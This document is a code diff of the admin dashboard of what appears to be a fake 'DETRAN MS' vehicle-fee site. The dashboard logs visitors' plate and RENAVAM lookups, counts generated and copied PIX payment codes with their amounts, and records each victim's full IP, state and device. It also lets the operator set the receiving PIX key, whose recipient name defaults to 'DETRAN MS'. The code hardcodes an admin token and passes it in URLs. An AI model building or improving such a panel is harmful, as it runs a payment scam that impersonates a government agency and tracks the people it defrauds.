@@ -563,7 +563,7 @@
         /* ========================================= */
         .valores-separados {
             display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
+            grid-template-columns: 1fr 1fr;
             gap: 15px;
             margin: 20px 0;
         }
@@ -656,7 +656,7 @@
                     <i class="fas fa-server"></i>
                 </div>
                 <h3>SISTEMA DETRAN MS</h3>
-                <small style="color: #aaa; font-size: 11px;">v2.6.1</small>
+                <small style="color: #aaa; font-size: 11px;">v2.6.0</small>
             </div>
             
             <div class="sidebar-menu">
@@ -726,15 +726,11 @@
             
             <!-- SEÇÃO: DASHBOARD -->
             <div id="section-dashboard" class="dashboard-section">
-                <!-- CORREÇÃO 5: VALORES SEPARADOS (AGORA COM 3 COLUNAS) -->
+                <!-- CORREÇÃO 5: VALORES SEPARADOS -->
                 <div class="valores-separados">
                     <div class="valor-card gerados">
                         <div class="valor-titulo">PIX Gerados</div>
                         <div class="valor-numero valor-gerados" id="valorGerados">R$ 0</div>
-                    </div>
-                    <div class="valor-card" style="border-color: var(--hacker-purple);">
-                        <div class="valor-titulo">QR Codes</div>
-                        <div class="valor-numero" style="color: var(--hacker-purple); text-shadow: 0 0 10px var(--hacker-purple);" id="valorQR">R$ 0</div>
                     </div>
                     <div class="valor-card copiados">
                         <div class="valor-titulo">PIX Copiados</div>
@@ -751,7 +747,7 @@
                         </div>
                         <div class="metric-value" id="onlineUsers">0</div>
                         <div style="font-size: 12px; color: #666;">
-                            <i class="fas fa-circle" style="color: var(--hacker-green);"></i> Páginas abertas agora
+                            <i class="fas fa-circle" style="color: var(--hacker-green);"></i> Ativos no sistema
                         </div>
                     </div>
                     
@@ -773,19 +769,18 @@
                         </div>
                         <div class="metric-value" id="pixCopiados">0</div>
                         <div style="font-size: 12px; color: #666;">
-                            <i class="fas fa-circle" style="color: var(--warning-color);"></i> Códigos copiados
+                            <i class="fas fa-circle" style="color: var(--warning-color);"></i> Códigos utilizados
                         </div>
                     </div>
                     
-                    <!-- NOVA MÉTRICA QR CODE -->
                     <div class="metric-card purple">
                         <div class="metric-header">
-                            <div class="metric-title">QR Code Visualizados</div>
-                            <i class="fas fa-qrcode metric-icon" style="color: var(--hacker-purple);"></i>
+                            <div class="metric-title">Total Cliques</div>
+                            <i class="fas fa-mouse-pointer metric-icon" style="color: var(--hacker-purple);"></i>
                         </div>
-                        <div class="metric-value" id="pixQR">0</div>
+                        <div class="metric-value" id="totalCliques">0</div>
                         <div style="font-size: 12px; color: #666;">
-                            <i class="fas fa-circle" style="color: var(--hacker-purple);"></i> QR Codes abertos
+                            <i class="fas fa-circle" style="color: var(--hacker-purple);"></i> Hoje: <span id="cliquesHoje">0</span>
                         </div>
                     </div>
                 </div>
@@ -861,7 +856,7 @@
                 </div>
             </div>
             
-            <!-- SEÇÃO: PIX GERADOS (COM CORREÇÃO 1: VALOR NA TABELA) -->
+            <!-- SEÇÃO: PIX GERADOS -->
             <div id="section-pix" class="dashboard-section hidden">
                 <div class="section-header">
                     <div class="section-title">
@@ -873,7 +868,7 @@
                     </button>
                 </div>
                 
-                <!-- CORREÇÃO 5: CONTADORES SEPARADOS (AGORA 4) -->
+                <!-- CORREÇÃO 5: CONTADORES SEPARADOS -->
                 <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px;">
                     <div style="background: rgba(0, 255, 255, 0.1); padding: 15px; border-radius: 5px; text-align: center; border: 1px solid var(--hacker-cyan);">
                         <div style="font-size: 24px; font-weight: bold; color: var(--hacker-cyan);" id="pixCountTotal">0</div>
@@ -884,12 +879,12 @@
                         <div style="font-size: 12px; color: #aaa;">Gerados</div>
                     </div>
                     <div style="background: rgba(157, 0, 255, 0.1); padding: 15px; border-radius: 5px; text-align: center; border: 1px solid var(--hacker-purple);">
-                        <div style="font-size: 24px; font-weight: bold; color: var(--hacker-purple);" id="pixCountQR">0</div>
-                        <div style="font-size: 12px; color: #aaa;">QR Code</div>
+                        <div style="font-size: 24px; font-weight: bold; color: var(--hacker-purple);" id="pixCountCopiados">0</div>
+                        <div style="font-size: 12px; color: #aaa;">Copiados</div>
                     </div>
                     <div style="background: rgba(255, 170, 0, 0.1); padding: 15px; border-radius: 5px; text-align: center; border: 1px solid var(--warning-color);">
-                        <div style="font-size: 24px; font-weight: bold; color: var(--warning-color);" id="pixCountCopiados">0</div>
-                        <div style="font-size: 12px; color: #aaa;">Copiados</div>
+                        <div style="font-size: 24px; font-weight: bold; color: var(--warning-color);" id="pixCountReais">0</div>
+                        <div style="font-size: 12px; color: #aaa;">Com chave real</div>
                     </div>
                 </div>
                 
@@ -904,7 +899,6 @@
                             <tr>
                                 <th>Data/Hora</th>
                                 <th>Tipo</th>
-                                <!-- CORREÇÃO 1: COLUNA VALOR ADICIONADA -->
                                 <th>Valor</th>
                                 <th>Placa</th>
                                 <th>RENAVAM</th>
@@ -1058,7 +1052,7 @@
                     <h3 style="margin-bottom: 10px; color: #aaa;">Nenhum usuário online</h3>
                     <p>Quando usuários acessarem o sistema, aparecerão aqui.</p>
                     <p style="font-size: 12px; color: #999; margin-top: 10px;">
-                        <i class="fas fa-info-circle"></i> Usuários são removidos após 30 segundos de inatividade
+                        <i class="fas fa-info-circle"></i> Usuários são removidos após 30 minutos de inatividade
                     </p>
                 </div>
             </div>
@@ -1212,7 +1206,7 @@
         // ============================================
         // CONFIGURAÇÕES DO SISTEMA - URL DINÂMICA
         // ============================================
-        const API_BASE = window.location.origin;
+        const API_BASE = window.location.origin; // Usa mesma origem do site
         const ADMIN_TOKEN = 'DETRAN-MS-ADMIN-TOKEN';
         
         console.log('🌐 API Base:', API_BASE);
@@ -1223,6 +1217,24 @@
         let refreshInterval = null;
         let currentSection = 'dashboard';
         let uptimeStart = Date.now();
+        
+        // ============================================
+        // CORREÇÃO AUTOMÁTICA DE URLS
+        // ============================================
+        (function corrigirURLs() {
+            const originalFetch = window.fetch;
+            window.fetch = function(url, options) {
+                if (typeof url === 'string') {
+                    if (url.includes('localhost:3000') || url.includes('127.0.0.1')) {
+                        const novaUrl = url.replace(/http:\/\/localhost:3000|http:\/\/127.0.0.1:3000/g, API_BASE);
+                        console.log('🔄 URL corrigida:', url, '→', novaUrl);
+                        url = novaUrl;
+                    }
+                }
+                return originalFetch.call(this, url, options);
+            };
+            console.log('✅ Correção de URLs ativada');
+        })();
         
         // ============================================
         // FUNÇÕES DE LOGIN
@@ -1240,6 +1252,7 @@
                 return;
             }
             
+            // Testa conexão com servidor
             try {
                 const testResponse = await fetch(`${API_BASE}`, { method: 'GET' });
                 if (!testResponse.ok) {
@@ -1251,6 +1264,7 @@
                 return;
             }
             
+            // Tenta login
             try {
                 const response = await fetch(`${API_BASE}/api/admin/login`, {
                     method: 'POST',
@@ -1264,6 +1278,7 @@
                     authToken = ADMIN_TOKEN;
                     currentUser = data.usuario;
                     
+                    // Salva no localStorage
                     localStorage.setItem('detran_admin_token', authToken);
                     localStorage.setItem('detran_admin_user', currentUser);
                     localStorage.setItem('detran_admin_nome', data.nome);
@@ -1276,6 +1291,7 @@
                     showDashboard();
                     carregarDashboard();
                     
+                    // Esconde alerta de conexão
                     document.getElementById('connectionAlert').style.display = 'none';
                 } else {
                     errorElement.textContent = data.mensagem || 'CREDENCIAIS INVÁLIDAS!';
@@ -1309,8 +1325,9 @@
             document.getElementById('loginScreen').style.display = 'none';
             document.getElementById('dashboard').style.display = 'flex';
             
+            // Inicia atualização automática
             if (refreshInterval) clearInterval(refreshInterval);
-            refreshInterval = setInterval(carregarDashboard, 5000); // Atualiza a cada 5s
+            refreshInterval = setInterval(carregarDashboard, 10000); // Atualiza a cada 10s
             setInterval(atualizarUptime, 1000);
         }
         
@@ -1318,17 +1335,21 @@
         // NAVEGAÇÃO
         // ============================================
         function showSection(sectionId) {
+            // Oculta todas as seções
             document.querySelectorAll('.dashboard-section').forEach(section => {
                 section.classList.add('hidden');
             });
             
+            // Atualiza menu ativo
             document.querySelectorAll('.menu-item').forEach(item => {
                 item.classList.remove('active');
             });
             
+            // Mostra seção selecionada
             document.getElementById(`section-${sectionId}`).classList.remove('hidden');
             document.querySelector(`.menu-item[onclick="showSection('${sectionId}')"]`).classList.add('active');
             
+            // Atualiza título
             const titles = {
                 'dashboard': 'SISTEMA DE MONITORAMENTO',
                 'consultas': 'HISTÓRICO DE CONSULTAS',
@@ -1341,6 +1362,7 @@
             
             currentSection = sectionId;
             
+            // Carrega dados específicos da seção
             if (sectionId === 'consultas') {
                 carregarConsultasCompletas();
             } else if (sectionId === 'pix') {
@@ -1359,6 +1381,7 @@
         // ============================================
         async function carregarDashboard() {
             if (!authToken) {
+                // Tenta recuperar do localStorage
                 const savedToken = localStorage.getItem('detran_admin_token');
                 const savedUser = localStorage.getItem('detran_admin_user');
                 
@@ -1396,6 +1419,7 @@
                     document.getElementById('serverStatusInfo').textContent = 'ONLINE';
                     document.getElementById('dbStatusInfo').textContent = 'ATIVO';
                     
+                    // Esconde alerta de conexão
                     document.getElementById('connectionAlert').style.display = 'none';
                 }
             } catch (error) {
@@ -1414,14 +1438,12 @@
             document.getElementById('onlineUsers').textContent = stats.usuariosOnline || 0;
             document.getElementById('totalPix').textContent = stats.pixGerados || 0;
             document.getElementById('pixCopiados').textContent = stats.pixCopiados || 0;
-            document.getElementById('pixQR').textContent = stats.pixQR || 0;
             document.getElementById('pixHoje').textContent = stats.pixHoje || 0;
             document.getElementById('totalCliques').textContent = stats.totalCliques || 0;
             document.getElementById('cliquesHoje').textContent = stats.cliquesHoje || 0;
             
-            // CORREÇÃO 3: TRÊS VALORES SEPARADOS
+            // CORREÇÃO 5: VALORES SEPARADOS
             document.getElementById('valorGerados').textContent = stats.valorGerados || 'R$ 0';
-            document.getElementById('valorQR').textContent = stats.valorQR || 'R$ 0';
             document.getElementById('valorCopiados').textContent = stats.valorCopiados || 'R$ 0';
             
             // Atualiza badges do menu
@@ -1431,14 +1453,17 @@
             document.getElementById('cliquesBadge').textContent = stats.totalCliques || 0;
             document.getElementById('usuariosBadge').textContent = stats.usuariosOnline || 0;
             
+            // Atualiza memória
             if (dados.sistema && dados.sistema.memoria) {
                 document.getElementById('memoryUsage').textContent = dados.sistema.memoria;
             }
             
+            // Atualiza últimas consultas
             if (dados.consultasCompletas && dados.consultasCompletas.length > 0) {
                 atualizarUltimasConsultas(dados.consultasCompletas);
             }
             
+            // Atualiza cliques recentes
             if (dados.cliquesRecentes && dados.cliquesRecentes.length > 0) {
                 atualizarCliquesRecentes(dados.cliquesRecentes);
             }
@@ -1447,6 +1472,7 @@
         function atualizarUltimasConsultas(consultas) {
             const tbody = document.getElementById('recentConsultas');
             
+            // Pega apenas as 5 mais recentes
             const recentes = consultas.slice(0, 5);
             
             tbody.innerHTML = recentes.map(consulta => `
@@ -1463,130 +1489,668 @@
         }
         
         function atualizarCliquesRecentes(cliques) {
+            // Pode ser usado para mostrar cliques recentes no dashboard
             console.log('Cliques recentes:', cliques.length);
         }
         
         // ============================================
-        // API PARA PAINEL ADMIN DASHBOARD (ATUALIZADA)
+        // CARREGAR CONSULTAS COMPLETAS (BANCO DE DADOS)
         // ============================================
-        app.get('/api/admin/dashboard', async (req, res) => {
+        async function carregarConsultasCompletas() {
+            const loading = document.getElementById('consultasLoading');
+            const table = document.getElementById('consultasTable');
+            const empty = document.getElementById('consultasEmpty');
+            
+            loading.style.display = 'block';
+            table.style.display = 'none';
+            empty.classList.add('hidden');
+            
             try {
-                const consultas = await readData('consultas.json');
-                const pix = await readData('pix.json');
-                const cliques = await readData('cliques.json');
-                const config = await readData('config.json');
-                
-                // Usuários online (últimos 30 segundos)
-                const agora = Date.now();
-                const usuariosAtivos = [];
-                
-                usuariosOnline.forEach((usuario, ip) => {
-                    const segundosInativo = Math.floor((agora - usuario.ultimaAtividade) / 1000);
-                    if (segundosInativo <= 30) { // Só os últimos 30 segundos
-                        usuariosAtivos.push({
-                            ...usuario,
-                            segundosInativo,
-                            status: segundosInativo > 10 ? 'inativo' : 'ativo'
-                        });
-                    }
+                const response = await fetch(`${API_BASE}/api/admin/buscar-consultas`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': authToken
+                    },
+                    body: JSON.stringify({
+                        pagina: 1,
+                        limite: 50
+                    })
                 });
                 
-                usuariosAtivos.sort((a, b) => a.segundosInativo - b.segundosInativo);
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    if (data.sucesso && data.resultados.length > 0) {
+                        exibirConsultasCompletas(data.resultados);
+                    } else {
+                        mostrarConsultasVazias();
+                    }
+                } else {
+                    mostrarConsultasVazias();
+                }
+            } catch (error) {
+                console.error('Erro ao carregar consultas:', error);
+                mostrarConsultasVazias();
+            }
+        }
+        
+        function exibirConsultasCompletas(consultas) {
+            const tbody = document.getElementById('consultasBody');
+            const loading = document.getElementById('consultasLoading');
+            const table = document.getElementById('consultasTable');
+            const empty = document.getElementById('consultasEmpty');
+            
+            tbody.innerHTML = consultas.map(consulta => `
+                <tr>
+                    <td>${new Date(consulta.dataHora).toLocaleString('pt-BR')}</td>
+                    <td><span class="status-badge success">${consulta.placa || 'N/A'}</span></td>
+                    <td><strong>${consulta.renavam || 'N/A'}</strong></td>
+                    <!-- CORREÇÃO 3: IP COMPLETO + ESTADO -->
+                    <td><div class="ip-display">${consulta.ipCompleto || consulta.ip || 'N/A'}</div></td>
+                    <td><span class="estado-badge">${consulta.estado || 'N/A'}</span></td>
+                    <td><span class="status-badge info">${consulta.dispositivo || 'Desconhecido'}</span></td>
+                    <td><span class="status-badge success">Registrada</span></td>
+                </tr>
+            `).join('');
+            
+            loading.style.display = 'none';
+            table.style.display = 'table';
+            empty.classList.add('hidden');
+        }
+        
+        function mostrarConsultasVazias() {
+            document.getElementById('consultasLoading').style.display = 'none';
+            document.getElementById('consultasTable').style.display = 'none';
+            document.getElementById('consultasEmpty').classList.remove('hidden');
+        }
+        
+        // ============================================
+        // CARREGAR PIX COMPLETOS (BANCO DE DADOS)
+        // ============================================
+        async function carregarPixCompletos() {
+            const loading = document.getElementById('pixLoading');
+            const table = document.getElementById('pixTable');
+            const empty = document.getElementById('pixEmpty');
+            
+            loading.style.display = 'block';
+            table.style.display = 'none';
+            empty.classList.add('hidden');
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/admin/buscar-pix`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': authToken
+                    },
+                    body: JSON.stringify({
+                        pagina: 1,
+                        limite: 50,
+                        categoria: 'todas'
+                    })
+                });
                 
-                // SEPARAÇÃO POR CATEGORIA (CORREÇÃO 3)
-                const pixGerados = pix.filter(p => p.categoria === 'gerado' || p.tipo === 'gerado');
-                const pixQR = pix.filter(p => p.categoria === 'qr' || p.tipo === 'qr');
-                const pixCopiados = pix.filter(p => p.categoria === 'copiado' || p.tipo === 'copiado');
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    if (data.sucesso && data.resultados.length > 0) {
+                        exibirPixCompletos(data.resultados);
+                        atualizarContadoresPix(data.resultados);
+                    } else {
+                        mostrarPixVazios();
+                    }
+                } else {
+                    mostrarPixVazios();
+                }
+            } catch (error) {
+                console.error('Erro ao carregar PIX:', error);
+                mostrarPixVazios();
+            }
+        }
+        
+        function exibirPixCompletos(pixList) {
+            const tbody = document.getElementById('pixBody');
+            const loading = document.getElementById('pixLoading');
+            const table = document.getElementById('pixTable');
+            const empty = document.getElementById('pixEmpty');
+            
+            tbody.innerHTML = pixList.map(pix => {
+                let tipoBadge = '';
+                if (pix.tipo === 'gerado') tipoBadge = '<span class="status-badge success">Gerado</span>';
+                else if (pix.tipo === 'copiado') tipoBadge = '<span class="status-badge warning">Copiado</span>';
+                else if (pix.tipo === 'real') tipoBadge = '<span class="status-badge info">Real</span>';
                 
-                const calcularTotal = (lista) => {
-                    return lista.reduce((total, item) => {
-                        const valor = parseFloat(item.valor) || 0;
-                        return total + valor;
-                    }, 0);
-                };
+                // CORREÇÃO 5: Categoria
+                const categoria = pix.categoria || (pix.tipo === 'copiado' ? 'copiado' : 'gerado');
+                const categoriaBadge = categoria === 'copiado' 
+                    ? '<span class="status-badge" style="background: rgba(157,0,255,0.2); color: var(--hacker-purple); border-color: var(--hacker-purple);">Copiado</span>'
+                    : '<span class="status-badge" style="background: rgba(0,255,255,0.2); color: var(--hacker-cyan); border-color: var(--hacker-cyan);">Gerado</span>';
                 
-                const valorGerados = calcularTotal(pixGerados);
-                const valorQR = calcularTotal(pixQR);
-                const valorCopiados = calcularTotal(pixCopiados);
+                return `
+                    <tr>
+                        <td>${new Date(pix.dataHora).toLocaleString('pt-BR')}</td>
+                        <td>${tipoBadge}</td>
+                        <td><strong style="color: ${categoria === 'copiado' ? 'var(--hacker-purple)' : 'var(--hacker-cyan)'};">R$ ${parseFloat(pix.valor || 0).toFixed(2).replace('.', ',')}</strong></td>
+                        <td>${pix.placa || 'N/A'}</td>
+                        <td>${pix.renavam || 'N/A'}</td>
+                        <!-- CORREÇÃO 3: IP COMPLETO + ESTADO -->
+                        <td>
+                            <div class="ip-display">${pix.ipCompleto || pix.ip || 'N/A'}</div>
+                            <span class="estado-badge">${pix.estado || 'N/A'}</span>
+                        </td>
+                        <td>${categoriaBadge}</td>
+                    </tr>
+                `;
+            }).join('');
+            
+            loading.style.display = 'none';
+            table.style.display = 'table';
+            empty.classList.add('hidden');
+        }
+        
+        function atualizarContadoresPix(pixList) {
+            const pixGerados = pixList.filter(p => p.categoria === 'gerado' || p.tipo === 'gerado').length;
+            const pixCopiados = pixList.filter(p => p.categoria === 'copiado' || p.tipo === 'copiado').length;
+            const pixReais = pixList.filter(p => p.tipo === 'real').length;
+            
+            document.getElementById('pixCountTotal').textContent = pixList.length;
+            document.getElementById('pixCountGerados').textContent = pixGerados;
+            document.getElementById('pixCountCopiados').textContent = pixCopiados;
+            document.getElementById('pixCountReais').textContent = pixReais;
+        }
+        
+        function mostrarPixVazios() {
+            document.getElementById('pixLoading').style.display = 'none';
+            document.getElementById('pixTable').style.display = 'none';
+            document.getElementById('pixEmpty').classList.remove('hidden');
+        }
+        
+        // ============================================
+        // CORREÇÃO 4: CARREGAR CLIQUES COMPLETOS
+        // ============================================
+        async function carregarCliquesCompletos() {
+            const loading = document.getElementById('cliquesLoading');
+            const table = document.getElementById('cliquesTable');
+            const empty = document.getElementById('cliquesEmpty');
+            
+            loading.style.display = 'block';
+            table.style.display = 'none';
+            empty.classList.add('hidden');
+            
+            try {
+                const filtroTipo = document.getElementById('filtroTipoClique').value;
+                const filtroEstado = document.getElementById('filtroEstadoClique').value;
+                const filtroIP = document.getElementById('filtroIPClique').value;
                 
-                // Consultas hoje
-                const hoje = new Date().toDateString();
-                const consultasHoje = consultas.filter(c => 
-                    new Date(c.dataHora).toDateString() === hoje
-                ).length;
+                const response = await fetch(`${API_BASE}/api/admin/buscar-cliques`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': authToken
+                    },
+                    body: JSON.stringify({
+                        pagina: 1,
+                        limite: 50,
+                        tipo: filtroTipo === 'todos' ? null : filtroTipo,
+                        filtro: filtroIP || null
+                    })
+                });
                 
-                // PIX hoje
-                const pixHoje = pix.filter(p => 
-                    new Date(p.dataHora).toDateString() === hoje
-                ).length;
-                
-                // Cliques hoje
-                const cliquesHoje = cliques.filter(c => 
-                    new Date(c.dataHora).toDateString() === hoje
-                ).length;
-                
-                res.json({
-                    sucesso: true,
-                    dados: {
-                        estatisticas: {
-                            usuariosOnline: usuariosAtivos.length,
-                            totalConsultas: consultas.length,
-                            consultasHoje: consultasHoje,
-                            
-                            // CORREÇÃO 3: TRÊS CATEGORIAS SEPARADAS
-                            pixGerados: pixGerados.length,
-                            pixQR: pixQR.length,
-                            pixCopiados: pixCopiados.length,
-                            pixHoje: pixHoje,
-                            
-                            valorGerados: `R$ ${valorGerados.toFixed(2).replace('.', ',')}`,
-                            valorQR: `R$ ${valorQR.toFixed(2).replace('.', ',')}`,
-                            valorCopiados: `R$ ${valorCopiados.toFixed(2).replace('.', ',')}`,
-                            valorTotal: `R$ ${(valorGerados + valorQR + valorCopiados).toFixed(2).replace('.', ',')}`,
-                            
-                            totalCliques: cliques.length,
-                            cliquesHoje: cliquesHoje
-                        },
-                        consultasCompletas: consultas.slice(-50).reverse().map(c => ({
-                            ...c,
-                            ipCompleto: c.ipCompleto || c.ip,
-                            estado: c.estado || 'N/A'
-                        })),
-                        pixCompletos: pix.slice(-50).reverse().map(p => ({
-                            ...p,
-                            ipCompleto: p.ipCompleto || p.ip,
-                            estado: p.estado || 'N/A',
-                            categoria: p.categoria || (p.tipo === 'copiado' ? 'copiado' : (p.tipo === 'qr' ? 'qr' : 'gerado')),
-                            valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}`
-                        })),
-                        cliquesRecentes: cliques.slice(-30).reverse().map(c => ({
-                            ...c,
-                            ipCompleto: c.ipCompleto || c.ip,
-                            estado: c.estado || 'N/A'
-                        })),
-                        usuariosOnline: usuariosAtivos.map(u => ({
-                            ...u,
-                            ipCompleto: u.ipCompleto || u.ip,
-                            estado: u.estado || 'N/A'
-                        })),
-                        sistema: {
-                            versao: '2.6.1',
-                            inicioOperacao: new Date().toLocaleDateString('pt-BR'),
-                            chavePix: config.chavePix ? config.chavePix.substring(0, 3) + '***' : 'Não configurada',
-                            chaveTipo: config.pixTipo || 'aleatoria',
-                            nomeRecebedor: config.nomeRecebedor || 'DETRAN MS',
-                            cidadeRecebedor: config.cidadeRecebedor || 'CAMPO GRANDE',
-                            identificador: config.pixIdentificador || 'PAGAMENTODETRAN',
-                            timerPagamento: config.timerPagamento || 900,
-                            memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    if (data.sucesso && data.resultados.length > 0) {
+                        // Aplica filtro de estado no frontend
+                        let resultadosFiltrados = data.resultados;
+                        if (filtroEstado !== 'todos') {
+                            resultadosFiltrados = resultadosFiltrados.filter(c => c.estado === filtroEstado);
                         }
+                        
+                        exibirCliquesCompletos(resultadosFiltrados);
+                        atualizarEstatisticasCliques(resultadosFiltrados);
+                    } else {
+                        mostrarCliquesVazios();
                     }
+                } else {
+                    mostrarCliquesVazios();
+                }
+            } catch (error) {
+                console.error('Erro ao carregar cliques:', error);
+                mostrarCliquesVazios();
+            }
+        }
+        
+        function exibirCliquesCompletos(cliquesList) {
+            const tbody = document.getElementById('cliquesBody');
+            const loading = document.getElementById('cliquesLoading');
+            const table = document.getElementById('cliquesTable');
+            const empty = document.getElementById('cliquesEmpty');
+            
+            tbody.innerHTML = cliquesList.map(clique => {
+                let tipoBadge = '';
+                if (clique.tipo === 'pix') tipoBadge = '<span class="status-badge" style="background: rgba(0,255,0,0.2); color: var(--hacker-green); border-color: var(--hacker-green);">PIX</span>';
+                else if (clique.tipo === 'consulta') tipoBadge = '<span class="status-badge" style="background: rgba(0,255,255,0.2); color: var(--hacker-cyan); border-color: var(--hacker-cyan);">Consulta</span>';
+                else if (clique.tipo === 'botao') tipoBadge = '<span class="status-badge" style="background: rgba(255,170,0,0.2); color: var(--warning-color); border-color: var(--warning-color);">Botão</span>';
+                else tipoBadge = '<span class="status-badge" style="background: rgba(157,0,255,0.2); color: var(--hacker-purple); border-color: var(--hacker-purple);">Link</span>';
+                
+                return `
+                    <tr>
+                        <td>${new Date(clique.dataHora).toLocaleString('pt-BR')}</td>
+                        <td><div class="ip-display">${clique.ipCompleto || clique.ip || 'N/A'}</div></td>
+                        <td><span class="estado-badge">${clique.estado || 'N/A'}</span></td>
+                        <td>${tipoBadge}</td>
+                        <td><small>${clique.elemento || 'N/A'}</small></td>
+                        <td><small>${clique.pagina || '/'}</small></td>
+                        <td><span class="status-badge info">${clique.dispositivo || 'Desconhecido'}</span></td>
+                    </tr>
+                `;
+            }).join('');
+            
+            loading.style.display = 'none';
+            table.style.display = 'table';
+            empty.classList.add('hidden');
+        }
+        
+        function atualizarEstatisticasCliques(cliquesList) {
+            const ipsUnicos = [...new Set(cliquesList.map(c => c.ip))].length;
+            const cliquesPIX = cliquesList.filter(c => c.tipo === 'pix').length;
+            
+            document.getElementById('cliquesTotal').textContent = cliquesList.length;
+            document.getElementById('cliquesUnicos').textContent = ipsUnicos;
+            document.getElementById('cliquesPIX').textContent = cliquesPIX;
+            
+            // Cliques hoje
+            const hoje = new Date().toDateString();
+            const cliquesHoje = cliquesList.filter(c => 
+                new Date(c.dataHora).toDateString() === hoje
+            ).length;
+            document.getElementById('cliquesHojeSection').textContent = cliquesHoje;
+        }
+        
+        function mostrarCliquesVazios() {
+            document.getElementById('cliquesLoading').style.display = 'none';
+            document.getElementById('cliquesTable').style.display = 'none';
+            document.getElementById('cliquesEmpty').classList.remove('hidden');
+        }
+        
+        function exportarCliques() {
+            window.open(`${API_BASE}/api/admin/exportar/cliques?token=${authToken}`, '_blank');
+        }
+        
+        // ============================================
+        // CARREGAR USUÁRIOS ONLINE (TEMPO REAL)
+        // ============================================
+        async function carregarUsuariosOnline() {
+            const loading = document.getElementById('usuariosLoading');
+            const grid = document.getElementById('usuariosGrid');
+            const empty = document.getElementById('usuariosEmpty');
+            
+            loading.style.display = 'block';
+            grid.style.display = 'none';
+            empty.classList.add('hidden');
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/admin/dashboard`, {
+                    headers: { 'Authorization': authToken }
                 });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    if (data.sucesso && data.dados.usuariosOnline) {
+                        exibirUsuariosOnline(data.dados.usuariosOnline);
+                    } else {
+                        mostrarUsuariosVazios();
+                    }
+                } else {
+                    mostrarUsuariosVazios();
+                }
+            } catch (error) {
+                console.error('Erro ao carregar usuários:', error);
+                mostrarUsuariosVazios();
+            }
+        }
+        
+        function exibirUsuariosOnline(usuarios) {
+            const grid = document.getElementById('usuariosGrid');
+            const loading = document.getElementById('usuariosLoading');
+            const empty = document.getElementById('usuariosEmpty');
+            
+            if (!usuarios || usuarios.length === 0) {
+                mostrarUsuariosVazios();
+                return;
+            }
+            
+            grid.innerHTML = usuarios.map(user => {
+                let dispositivoIcon = 'fa-desktop';
+                if (user.dispositivo === 'Mobile') dispositivoIcon = 'fa-mobile-alt';
+                if (user.dispositivo === 'Android') dispositivoIcon = 'fa-android';
+                if (user.dispositivo === 'iOS') dispositivoIcon = 'fa-apple';
+                
+                let statusColor = 'var(--hacker-green)';
+                if (user.segundosInativo > 300) statusColor = 'var(--warning-color)';
+                if (user.segundosInativo > 900) statusColor = 'var(--danger-color)';
+                
+                return `
+                    <div style="background: rgba(0, 20, 40, 0.8); border-radius: 5px; padding: 15px; border-left: 4px solid ${statusColor}; border: 1px solid rgba(0, 255, 0, 0.2);">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                            <div style="font-weight: 600; color: var(--hacker-cyan);">
+                                <i class="fas fa-user"></i> 
+                                <!-- CORREÇÃO 3: IP COMPLETO -->
+                                <div class="ip-display">${user.ipCompleto || user.ip || 'IP Desconhecido'}</div>
+                            </div>
+                            <i class="fab ${dispositivoIcon}" style="color: #666;"></i>
+                        </div>
+                        <div style="color: #aaa; font-size: 13px; margin-bottom: 5px;">
+                            <i class="fas fa-laptop"></i> ${user.dispositivo || 'Desconhecido'}
+                        </div>
+                        <div style="color: #aaa; font-size: 13px; margin-bottom: 5px;">
+                            <i class="fas fa-map-marker-alt"></i> Estado: <span class="estado-badge">${user.estado || 'N/A'}</span>
+                        </div>
+                        <div style="color: #aaa; font-size: 12px; margin-bottom: 5px;">
+                            <i class="fas fa-globe"></i> ${user.paginaAtual || '/'}
+                        </div>
+                        <div style="color: ${statusColor}; font-size: 12px; font-weight: bold;">
+                            <i class="far fa-clock"></i> Inativo há ${user.segundosInativo || 0}s
+                        </div>
+                    </div>
+                `;
+            }).join('');
+            
+            loading.style.display = 'none';
+            grid.style.display = 'grid';
+            empty.classList.add('hidden');
+        }
+        
+        function mostrarUsuariosVazios() {
+            document.getElementById('usuariosLoading').style.display = 'none';
+            document.getElementById('usuariosGrid').style.display = 'none';
+            document.getElementById('usuariosEmpty').classList.remove('hidden');
+        }
+        
+        function atualizarUsuarios() {
+            carregarUsuariosOnline();
+        }
+        
+        // ============================================
+        // CONFIGURAÇÕES
+        // ============================================
+        async function carregarConfiguracoes() {
+            try {
+                const response = await fetch(`${API_BASE}/api/admin/dashboard`, {
+                    headers: { 'Authorization': authToken }
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.sucesso && data.dados.sistema) {
+                        const sistema = data.dados.sistema;
+                        
+                        // Preenche campos do formulário
+                        document.getElementById('pixTipo').value = sistema.chaveTipo || 'aleatoria';
+                        document.getElementById('pixChave').value = sistema.chavePix || '';
+                        document.getElementById('pixNome').value = sistema.nomeRecebedor || 'DETRAN MS';
+                        document.getElementById('pixCidade').value = sistema.cidadeRecebedor || 'CAMPO GRANDE';
+                        document.getElementById('pixIdentificador').value = sistema.identificador || 'PAGAMENTODETRAN';
+                    }
+                }
+            } catch (error) {
+                console.error('Erro ao carregar configurações:', error);
+            }
+        }
+        
+        async function salvarConfigPIXCompleta() {
+            const pixTipo = document.getElementById('pixTipo').value;
+            const pixChave = document.getElementById('pixChave').value.trim();
+            const pixNome = document.getElementById('pixNome').value.trim();
+            const pixCidade = document.getElementById('pixCidade').value.trim();
+            const pixIdentificador = document.getElementById('pixIdentificador').value.trim();
+            
+            if (!pixChave) {
+                alert('DIGITE UMA CHAVE PIX VÁLIDA!');
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/admin/config`, {
